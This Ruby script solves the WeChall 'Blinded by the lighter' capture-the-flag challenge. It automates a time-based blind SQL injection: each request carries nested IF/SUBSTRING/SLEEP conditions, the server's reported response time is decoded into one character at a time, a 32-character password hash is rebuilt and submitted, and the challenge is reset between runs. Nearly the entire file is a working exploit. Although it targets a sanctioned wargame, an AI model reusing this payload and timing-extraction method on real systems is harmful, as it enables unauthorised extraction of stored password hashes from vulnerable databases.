require 'open-uri'
require 'net/http'


#CHANGE
$cookie = "WC=putYourCookie"




$url = "www.wechall.net"
$path = "/challenge/blind_lighter/index.php"




$times = 1
$hash = ""
$time_taken = 0.0
$base_sleep_time = 1.5

$char_set = ['A', 'B', 'C', 'D', 'E', 'F', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

#This method gets the result back from the server
def http_request(post_data)
	headers = {
		'Referer' => "http://www.wechall.net/challenge/blind_lighter/index.php",
		'Cookie' => "#{$cookie}",
		'Content-Type' => 'application/x-www-form-urlencoded'
	}
	http = Net::HTTP.new("#{$url}")
	#send the request
	resp, data = http.post($path, post_data, headers)
	#get the php time from the page
	$time_taken = resp.body.scan(/PHP Time:\s\d+.\d+s/).to_s.split(" ")[2].to_s.split("s")[0].to_f
	#calculate the differance (the time taken)
	#$time_taken = finish - start
	#return the result of the query
	return resp
end

def start()
	puts "#{$times}/3"
	#If this is the first time every, or the first time after a wrong answer, reset the challange
	if $times == 1
		reset()
	end
	for n in 1..32
		#Building the SQLi query
		#The query asks the server to wait a multiple of the variable (base_sleep_time)
		#based on the char
		post_data = "ll' or 'a' = 'a' and ( " \
					"if(substring(b.password,#{n},1)='#{$char_set[0]}', sleep(#{$base_sleep_time}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[1]}', sleep(#{$base_sleep_time*2}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[2]}', sleep(#{$base_sleep_time*3}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[3]}', sleep(#{$base_sleep_time*4}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[4]}', sleep(#{$base_sleep_time*5}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[5]}', sleep(#{$base_sleep_time*6}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[6]}', sleep(#{$base_sleep_time*7}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[7]}', sleep(#{$base_sleep_time*8}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[8]}', sleep(#{$base_sleep_time*9}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[9]}', sleep(#{$base_sleep_time*10}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[10]}', sleep(#{$base_sleep_time*11}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[11]}', sleep(#{$base_sleep_time*12}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[12]}', sleep(#{$base_sleep_time*13}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[13]}', sleep(#{$base_sleep_time*14}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[14]}', sleep(#{$base_sleep_time*15}), 1) and " \
					"if(substring(b.password,#{n},1)='#{$char_set[15]}', sleep(#{$base_sleep_time*16}), 1) and 1);-- -"
		#send the request to the server
		post_data = "injection=#{post_data}&inject=Inject"
		http_request(post_data)
		#Calculating the index. Since the wait time is multipl of (base_sleep_time), we divid
		#by (base_sleep_time)
		i = (($time_taken)/$base_sleep_time).to_i

		
		#print the char we found
		puts "The char number #{n} is #{$char_set[i-1]}"
		puts "time taken is: #{$time_taken}"
		puts "i is: #{i-1}"
		#append the char to the hash
		$hash = $hash + $char_set[i-1].to_s
		#sleep for 2 seconds before sending another request
		sleep(2)
		
	end
	#When finished, print the hash
	puts "The hash is #{$hash}"
end

#This function resets the challenage and print the old hash (that we got wrong)
def reset()
	#http = Net::HTTP.new("#{$url}")
	http = Net::HTTP.new("#{$url}")
	resp, data = http.get("#{$path}?reset=me", { 'Cookie' => $cookie })
	puts "I've reset the challenge"
	puts "The previouse hash was: #{resp.body.to_s.scan(/To help you a bit here is your last hash:\s\S{32}/).to_s.split(" ")[10].to_s.split("\"")[0]}"
end


#This function submits the hash and check if the answer is correct or not.
def submit()
	post_data = "thehash=#{$hash}&mybutton=Enter"
	resp, data = http_request(post_data)
	if resp.body.to_s.include? "Wow, you were able to"
		
		puts "Yaay! solved the challenge #{$times} time/s"
		$times = $times + 1
	elsif resp.body.to_s.include? "Your answer is correct"
		puts "YES! FINALLY, WE DID IT!!"
		puts "Go to here and check your name: http://www.wechall.net/challenge_solvers_for/103/Blinded+by+the+lighter/page-3"
		exit
	else
		puts "Wrong hash! :("

		$times = 1
	end
	$hash = ""	
end


while $times != 4 do
	start()
	submit()
end

